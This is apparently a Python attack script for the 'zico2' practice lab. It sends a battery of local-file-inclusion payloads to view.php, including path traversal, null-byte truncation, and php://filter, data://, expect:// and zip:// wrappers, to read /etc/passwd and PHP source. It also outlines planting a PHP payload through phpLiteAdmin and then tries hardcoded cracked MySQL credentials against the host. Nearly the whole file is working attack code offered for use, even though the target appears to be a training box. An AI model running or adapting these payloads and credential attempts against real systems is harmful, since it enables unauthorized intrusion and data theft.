#!/usr/bin/env python3
"""zico2 - Read phpLiteAdmin PHP source via LFI (raw, not rendered)"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'

# The LFI includes the file via PHP include()
# So test_db.php gets EXECUTED when included
# We need a way to read the raw source
# 
# Try: use LFI to read test_db.php through a different vector
# Since the LFI uses include(), PHP code gets executed
# But we can try to use a null byte to truncate and get raw content

# Actually, try the file with the base64 approach
# Apache 2.2.22 + PHP 5.x might support php://filter through the LFI
# But we saw 0 bytes... maybe the LFI has additional filtering

# Let's check what exactly the LFI filter blocks
print('=== LFI filter analysis ===')
test_payloads = [
    ('../../../etc/passwd', 'Classic traversal'),
    ('....//....//....//etc/passwd', 'Double dot-slash'),
    ('..%2f..%2f..%2fetc/passwd', 'URL encoded slash'),
    ('..%252f..%252f..%252fetc/passwd', 'Double URL encoded'),
    ('/etc/passwd', 'Absolute path'),
    ('..\/..\/..\/etc/passwd', 'Backslash'),
    ('....\\/....\\/....\\/etc/passwd', 'Backslash bypass'),
    ('../../../etc/passwd%00', 'Null byte'),
    ('../../../etc/passwd%00.jpg', 'Null byte + ext'),
    ('php://filter/convert.base64-encode/resource=../../../var/www/dbadmin/test_db.php', 'php://filter'),
    ('data://text/plain,<?php phpinfo(); ?>', 'data:// wrapper'),
    ('expect://id', 'expect:// wrapper'),
    ('zip:///tmp/test.zip%23test', 'zip:// wrapper'),
]

for payload, desc in test_payloads:
    r = s.get(f'{BASE}/view.php?page={payload}', timeout=8)
    has_root = 'root:' in r.text
    has_hack = 'Hacking' in r.text or 'hack' in r.text.lower()
    has_php_err = 'error' in r.text.lower()[:100] and 'sql' not in r.text.lower()
    
    if has_root:
        status = 'OK - passwd leaked'
    elif has_hack:
        status = 'BLOCKED'
    elif len(r.text) == 0:
        status = 'EMPTY'
    elif has_php_err:
        status = f'PHP ERROR'
    else:
        status = f'OTHER ({len(r.text)}B)'
    
    print(f'  {desc}: {status}')

# Since we can't read PHP source, let's use the info we have
# phpLiteAdmin page shows: Database name: /usr/databases/test_users
# The newdb form sends 'new_dbname' to the server
# When we created ../../var/www/s.php, it returned 200 (no error)
# But the file didn't appear at /s.php
# 
# Theory: phpLiteAdmin might use basename() or realpath() on the name
# So ../../var/www/s.php becomes just s.php (stored in /usr/databases/s.php)
# And /usr/databases/ is NOT web accessible
#
# Solution: We need to find a web-accessible directory under /var/www/
# that we can write to, OR use a different exploitation path

print('\n=== Checking writable paths ===')
# Check if /var/www/img/ or /var/www/js/ or /var/www/css/ are writable
writable_checks = [
    '/var/www/img/', '/var/www/js/', '/var/www/css/',
    '/var/www/dbadmin/', '/tmp/', '/usr/tmp/',
]
for wp in writable_checks:
    # We can't directly check write permissions via HTTP
    # But we can try to create a file there via phpLiteAdmin
    pass

# The real trick for zico2: 
# We know the DB directory is /usr/databases/
# We need to use LFI to INCLUDE the SQLite file we create
# The SQLite file has binary header + our PHP payload in it
# PHP include() will try to execute it, but the SQLite header will cause a parse error
# UNLESS we use a specific SQLite feature or the PHP code is positioned correctly

# Actually the REAL zico2 exploit is simpler:
# The phpLiteAdmin password is the MySQL password!
# Or: use the cracked credentials directly with MySQL
print('\n=== Trying MySQL with cracked credentials ===')
try:
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex(('192.168.18.132', 3306))
    if result == 0:
        print('  MySQL port 3306: OPEN')
    else:
        print('  MySQL port 3306: CLOSED')
    sock.close()
except:
    print('  MySQL port check error')

# If MySQL is open, try to connect with the cracked credentials
try:
    import pymysql
    for user, pwd in [('root', '34kroot34'), ('zico', 'zico2215@')]:
        try:
            conn = pymysql.connect(host='192.168.18.132', user=user, password=pwd, connect_timeout=10)
            print(f'  [+] MySQL LOGIN: {user}:{pwd}')
            cursor = conn.cursor()
            cursor.execute('SELECT user(), version()')
            for row in cursor.fetchall():
                print(f'    {row}')
            cursor.execute('SHOW DATABASES')
            for row in cursor.fetchall():
                print(f'    DB: {row[0]}')
            conn.close()
            break
        except Exception as e:
            print(f'  [-] MySQL {user}:{pwd} failed: {str(e)[:80]}')
except ImportError:
    print('  pymysql not installed')
